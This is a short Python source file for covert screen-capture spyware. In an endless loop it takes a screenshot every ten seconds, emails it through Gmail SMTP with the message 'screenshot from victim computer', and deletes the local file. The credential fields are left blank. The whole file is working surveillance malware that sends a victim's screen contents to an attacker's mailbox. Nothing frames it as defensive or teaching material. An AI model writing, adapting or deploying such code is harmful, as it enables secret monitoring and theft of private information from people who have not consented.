from email.message import EmailMessage
import ssl
import smtplib
import pyautogui
from PIL import Image
import os
from pathlib import Path
import time


def take_screenshot():
    global image_full_path
    # Find path to home directory
    home_dir = Path.home()
    # Join home directory with folder name
    path = os.path.join(home_dir, "AppData/Local/Temp")
    
    # Take screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save(path + '\\' + "screenshot.jpg")
    image_full_path = path + '\\' + "screenshot.jpg"


def send_email():

    take_screenshot()
           
    email_sender = ""
    email_password = ""
    email_receiver = ""

    subject = "Test 1"
    body = "screenshot from victim computer"

    msg = EmailMessage()
    msg['From'] = email_sender
    msg['To'] = email_receiver
    msg['subject'] = subject

    msg.set_content(body)

    img = Image.open(image_full_path)
    with open(image_full_path, "rb") as f:
        img_data = f.read()
        img_type = img.format
        img_name = f.name

    msg.add_attachment(img_data, maintype='image', subtype=img_type, filename=img_name)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email_sender, email_password)
        smtp.send_message(msg)



while True:
    time.sleep(10)
    send_email()

    os.remove(image_full_path)
